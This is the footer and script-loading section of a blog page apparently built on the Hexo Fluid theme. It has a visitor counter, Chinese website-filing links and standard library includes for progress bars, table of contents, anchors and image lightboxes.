        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
    <!-- å¤‡æ¡ˆä¿¡æ¯ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      äº¬ICPè¯123456å·
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>äº¬å…¬ç½‘å®‰å¤‡12345678å·</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
